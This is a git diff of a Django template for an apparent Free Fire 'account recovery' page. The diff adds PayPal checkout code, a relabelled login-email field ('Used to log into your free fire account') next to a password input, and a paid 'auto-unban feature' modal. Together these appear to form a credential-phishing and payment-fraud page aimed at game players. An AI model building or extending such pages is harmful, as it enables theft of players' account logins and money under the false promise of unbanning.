@@ -9,6 +9,11 @@
 <!-- NavBar-->
 {% include 'src/nav.html' %}
 <!-- Main Content-->
+<!-- ========== Start PAYPAL ========== -->
+<script src="https://www.paypal.com/sdk/js?client-id=AS7tOMxm8yiSX3gv89Yfrtv5LzknYQ6Gcyd6Xrklrb8cm5ZrMpntTzTmO9lM7g0ZN4wcPNIOSy2F5k77&currency=USD"></script>
+
+
+<!-- ========== End PAYPAL ========== -->
 <style>
   .purple-bg{
     background-color: #21D4FD;
@@ -63,6 +68,20 @@
         {% include "src/countdown.html" %}
       </div>
       <div class="tw-h-screen tw-text-white pt-5">
+        <div class="mx-auto w-100 mb-5" style="max-width: 500px;">
+          <!-- !  ERROR CONTAINER -->
+        <div id="error-cont" class="alert alert-danger alert-dismissible fade show" role="alert">
+          <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
+          <p>hey</p>
+        </div>
+        
+        <!-- ! SUCCESS CONTAINER -->
+        <div id="success-cont" class="alert alert-primary alert-dismissible fade show" role="alert">
+          <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
+          <p>hey</p>
+        </div>
+   
+        </div>
         <div>
           <div class="mx-auto tw-rounded-sm p-5 tw-shadow-lg max-w-sm tw-bg-slate-400 tw-mb-12 glass-bg">
                 <form id="recovery-form" method="post">
@@ -72,7 +91,7 @@
                     <!-- Email input -->
                     <div class="form-outline mb-4">
                     <input type="text"  id="form1Example1" name="player_acct" required class="form-control tw-bg-transparent border-0 focus:tw-bg-transparent focus:tw-outline-none input-bx" />
-                    <label class="form-label" for="form1Example1">Email</label>
+                    <label class="form-label" for="form1Example1">Email (Used to log into your free fire account)</label>
                     </div>
 
                     <!-- Password input -->
@@ -103,10 +122,19 @@
         </div>
         <div class="modal-body">
             click purchase to use our auto-unban feature
-        </div>
-        <div class="modal-footer justify-content-between">
-          <button type="button" data-bs-dismiss="modal" class="btn confirm_btn" >Close</button>
+      
+            <hr/>
+      <div class = "py-3  pt-4">
+                  <div class="d-flex align-items-center px-1 mb-2 w-100 justify-content-between">
+            <button type="button" data-bs-dismiss="modal" class="btn confirm_btn" >Close</button>
              {{paypal_btn.render_form}}
+          </div>
+          
+
+          <div id="paypal-button-container"></div>
+      </div> 
+
+             
         </div>
       </div>
     </div>
@@ -116,10 +144,7 @@
 
 
   <!-- warning modal -->
-  <!-- Modal trigger button -->
 
-  <!-- Modal Body -->
-  <!-- if you want to close by clicking outside the modal, delete the last endpoint:data-bs-backdrop and data-bs-keyboard -->
   <div class="modal fade" id="warning-modal" tabindex="-1" data-bs-backdrop="static" data-bs-keyboard="false" role="dialog" aria-labelledby="modalTitleId" aria-hidden="true">
     <div class="modal-dialog modal-dialog-scrollable modal-dialog-centered modal-sm" role="document">
       <div class="modal-content">
@@ -146,6 +171,8 @@
 {% block scripts %}
 {% include 'src/scripts.html' %}
 <script>
+      
+
     const modal = document.getElementById('payment-modal')
     const paymentModal = new bootstrap.Modal(modal,{})
 
@@ -167,6 +194,7 @@
         if(data.player_id.length < 9 )return invalid_id()
         //fetch('{% url 'send_unban_mail' %}'+data.player_acct)
         paymentModal.show()
+
     })
   {% comment %} !timer.js {% endcomment %}
    
@@ -238,5 +266,94 @@
     warningModal.show()
 
 </script>
+
+<!-- logic -->
+<script defer>
+  const errContainer = document.getElementById("error-cont")
+const successContainer = document.getElementById("success-cont")
+errContainer.style.display= 'none'
+successContainer.style.display = 'none'
+
+
+const showError=err=>{
+  errContainer.querySelector('p').innerText = err
+  errContainer.style.display = 'block'
+}
+const showSuccess=err=>{
+  successContainer.querySelector('p').innerText = err
+  successContainer.style.display = 'block'
+}
+showSuccess("test successfull")
+  paypal.Buttons({
+    funding: {
+ allowed: [ paypal.FUNDING.CARD ],
+ disallowed: [ paypal.FUNDING.CREDIT ]
+},
+style: {
+
+color: 'blue',
+
+shape: 'pill',
+
+
+
+},
+// Call your server to set up the transaction
+createOrder: function(data, actions) {
+return actions.order.create({
+purchase_units:[
+  {
+      amount:{
+          value:'{{price}}'
+      }
+  }
+]
+})
+},
+
+// Call your server to finalize the transaction
+onApprove: function(data, actions) {
+return fetch('/demo/checkout/api/paypal/order/' + data.orderID + '/capture/', {
+method: 'post'
+}).then(function(res) {
+return res.json();
+}).then(function(orderData) {
+// Three cases to handle:
+//   (1) Recoverable INSTRUMENT_DECLINED -> call actions.restart()
+//   (2) Other non-recoverable errors -> Show a failure message
+//   (3) Successful transaction -> Show confirmation or thank you
+
+
+var errorDetail = Array.isArray(orderData.details) && orderData.details[0];
+
+if (errorDetail && errorDetail.issue === 'INSTRUMENT_DECLINED') {
+  return actions.restart(); // Recoverable state, per:
+  // https://developer.paypal.com/docs/checkout/integration-features/funding-failure/
+}
+
+if (errorDetail) {
+  var msg = 'Sorry, your transaction could not be processed.';
+  if (errorDetail.description) msg += '\n\n' + errorDetail.description;
+  if (orderData.debug_id) msg += ' (' + orderData.debug_id + ')';
+  return showError(msg)
+}
+
+// Successful capture! For demo purposes:
+console.log('Capture result', orderData, JSON.stringify(orderData, null, 2));
+var transaction = orderData.purchase_units[0].payments.captures[0];
+fetch('{% url "users-payment" %}/{{invoice.item_id}}')
+.then(e=>{
+    window.location.href = "{% url 'invoice' %}{{invoice.item_id }}"
+})
+});
+}
+
+}).render('#paypal-button-container');
+
+
+
+
+</script>
+
 {% endblock scripts %}
 <!-- ========== End Scripts ========== -->
